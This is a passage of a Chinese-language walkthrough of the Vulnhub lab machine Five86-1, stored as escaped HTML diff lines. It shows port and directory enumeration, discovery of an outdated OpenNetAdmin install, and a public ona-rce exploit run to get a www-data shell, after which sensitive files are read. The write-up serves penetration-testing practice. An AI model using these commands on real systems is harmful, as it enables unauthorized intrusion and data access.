+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; to bypass the removal of &lt;span class="s2"&gt;&amp;#34;../&amp;#34;&lt;/span&gt; directory traversal sequences.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Disclosure date: 2006-06-29
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; References:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class="o"&gt;=&lt;/span&gt;CVE-2006-3392
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ http://www.exploit-db.com/exploits/1997/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;MAC Address: 00:0C:29:7A:0B:AF &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 32.32 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;端口&lt;/th&gt;
+ &lt;th&gt;服务&lt;/th&gt;
+ &lt;th&gt;发现&lt;/th&gt;
+ &lt;th&gt;备注&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;22/tcp&lt;/td&gt;
+ &lt;td&gt;SSH&lt;/td&gt;
+ &lt;td&gt;未发现漏洞&lt;/td&gt;
+ &lt;td&gt;常规服务&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;80/tcp&lt;/td&gt;
+ &lt;td&gt;HTTP (Apache)&lt;/td&gt;
+ &lt;td&gt;/reports/ 目录返回 401 Unauthorized&lt;/td&gt;
+ &lt;td&gt;存在受保护目录，可能包含敏感报告&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;80/tcp&lt;/td&gt;
+ &lt;td&gt;HTTP (Apache)&lt;/td&gt;
+ &lt;td&gt;robots.txt 泄露 /ona 路径&lt;/td&gt;
+ &lt;td&gt;信息泄露&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;10000/tcp&lt;/td&gt;
+ &lt;td&gt;Webmin (MiniServ 1.920)&lt;/td&gt;
+ &lt;td&gt;&lt;strong&gt;CVE-2006-3392 (Webmin File Disclosure)&lt;/strong&gt;&lt;/td&gt;
+ &lt;td&gt;可任意读取文件，无需认证&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="web服务探测"&gt;Web服务探测
+&lt;/h3&gt;&lt;p&gt;在浏览器对80端口进行访问发现是个空白页面，稍后进行目录爆破&lt;/p&gt;
+&lt;p&gt;对10000端口访问，提示Error - Document follows&lt;/p&gt;
+&lt;p&gt;This web server is running in SSL mode. Try the URL &lt;code&gt;https://10.10.10.103:10000/&lt;/code&gt; instead.&lt;/p&gt;
+&lt;p&gt;点击这个https，是一个Webmin登陆表单&lt;/p&gt;
+&lt;h3 id="目录爆破"&gt;目录爆破
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo dirb http://10.10.10.103
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;http://10.10.10.103/index.html (CODE:200|SIZE:30)&lt;/li&gt;
+&lt;li&gt;http://10.10.10.103/reports (CODE:401|SIZE:459)&lt;/li&gt;
+&lt;li&gt;http://10.10.10.103/robots.txt (CODE:200|SIZE:29)&lt;/li&gt;
+&lt;li&gt;http://10.10.10.103/server-status (CODE:403|SIZE:277)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;暴露出来这四个，其中目前有用的是 robots.txt reports&lt;/p&gt;
+&lt;h2 id="漏洞发现及其利用"&gt;漏洞发现及其利用
+&lt;/h2&gt;&lt;h3 id="访问robotstxt-目录"&gt;访问/robots.txt 目录
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User-agent: *
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Disallow: /ona
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里泄露一个新目录 /ona&lt;/p&gt;
+&lt;h3 id="访问-ona"&gt;访问 /ona
+&lt;/h3&gt;&lt;p&gt;一个没见过的网页工具,在搜索引擎中得到以下信息&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;OpenNetAdmin（简称 ONA）是一个开源的 ==‌**IP 地址管理（IPAM）工具**‌==，用来帮网络管理员跟踪和管理网络里的各种信息，比如 IP 地址、DNS 名称、子网、MAC 地址这些
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;它用 ‌**PHP + MySQL**‌ 开发，支持通过浏览器操作，也提供命令行工具，方便批量处理和自动化脚本
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;a class="link" href="https://github.com/opennetadmin/ona" target="_blank" rel="noopener"
+ &gt;https://github.com/opennetadmin/ona&lt;/a&gt; 开源项目地址在这&lt;/p&gt;
+&lt;p&gt;值得注意的是&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;You are NOT on the latest release version 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Your version    = v18.1.1 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Latest version = v19.0.3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;目前的版本很旧，如果后面没有入手点，我们可以尝试找找这个项目版本的历史漏洞&lt;/p&gt;
+&lt;p&gt;甚至在GitHub搜索OpenNetAdmin 18.1.1 第一个就是这个项目的rce脚本&lt;/p&gt;
+&lt;p&gt;&lt;a class="link" href="https://github.com/amriunix/ona-rce" target="_blank" rel="noopener"
+ &gt;https://github.com/amriunix/ona-rce&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id="访问-reports"&gt;访问 /reports
+&lt;/h3&gt;&lt;p&gt;弹出一个登陆框，访问需要验证，目前没有任何信息可以支持我们进行尝试&lt;/p&gt;
+&lt;h3 id="利用公开rce脚本获取shell"&gt;利用公开rce脚本获取shell
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ git clone https://github.com/amriunix/ona-rce.git 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;正克隆到 &lt;span class="s1"&gt;&amp;#39;ona-rce&amp;#39;&lt;/span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;remote: Enumerating objects: 11, &lt;span class="k"&gt;done&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;remote: Counting objects: 100% &lt;span class="o"&gt;(&lt;/span&gt;11/11&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;remote: Compressing objects: 100% &lt;span class="o"&gt;(&lt;/span&gt;9/9&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;remote: Total &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta 4&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta 2&lt;span class="o"&gt;)&lt;/span&gt;, pack-reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;from 0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;接收对象中: 100% &lt;span class="o"&gt;(&lt;/span&gt;11/11&lt;span class="o"&gt;)&lt;/span&gt;, 552.45 KiB &lt;span class="p"&gt;|&lt;/span&gt; 4.25 MiB/s, 完成.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;处理 delta 中: 100% &lt;span class="o"&gt;(&lt;/span&gt;4/4&lt;span class="o"&gt;)&lt;/span&gt;, 完成.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ona-rce
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ &lt;span class="nb"&gt;cd&lt;/span&gt; ona-rce 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1/ona-rce&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ ls 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ona-proof.png ona-rce.py README.md
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1/ona-rce&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ chmod +x ona-rce.py 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1/ona-rce&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ python3 ona-rce.py check http://10.10.10.103/ona
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; OpenNetAdmin 18.1.1 - Remote Code Execution
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Connecting !
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; The remote host is vulnerable!
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1/ona-rce&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ python3 ona-rce.py exploit http://10.10.10.103/ona
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; OpenNetAdmin 18.1.1 - Remote Code Execution
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Connecting !
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Connected Successfully!
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sh$ whoami&lt;span class="p"&gt;;&lt;/span&gt;id&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;33&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;33&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;33&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/opt/ona/www
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sh$ 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="寻找当前用户可以读取的文件"&gt;寻找当前用户可以读取的文件
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sh$ find / -type f -user www-data
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;/var/www/html/reports/.htaccess
+/var/log/ona.log&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sh$ cat /var/www/html/reports/.htaccess
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;AuthType Basic
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;AuthName &lt;span class="s2"&gt;&amp;#34;Restricted Area&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;AuthUserFile /var/www/.htpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;require valid-user
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sh$ cat /var/log/ona.log
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dec &lt;span class="m"&gt;31&lt;/span&gt; 9:27:32 five86-1 anonymous@: &lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;INFO&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Dropped existing DB: ona_onadb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dec &lt;span class="m"&gt;31&lt;/span&gt; 9:27:32 five86-1 anonymous@: &lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;INFO&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Added new DB: ona_onadb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dec &lt;span class="m"&gt;31&lt;/span&gt; 9:27:33 five86-1 anonymous@: &lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;INFO&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Creating and updating tables within new DB: ona_onadb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dec &lt;span class="m"&gt;31&lt;/span&gt; 9:27:33 five86-1 anonymous@: &lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;INFO&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Loaded data to new DB: ona_onadb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dec &lt;span class="m"&gt;31&lt;/span&gt; 9:27:33 five86-1 anonymous@: &lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;INFO&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Created new DB user: ona_sys
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dec &lt;span class="m"&gt;31&lt;/span&gt; 9:30:46 five86-1 guest@192.168.0.108: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Jan &lt;span class="m"&gt;1&lt;/span&gt; 4:22:51 five86-1 guest@192.168.0.140: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;8&lt;/span&gt; 4:23:42 five86-1 guest@10.10.10.1: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
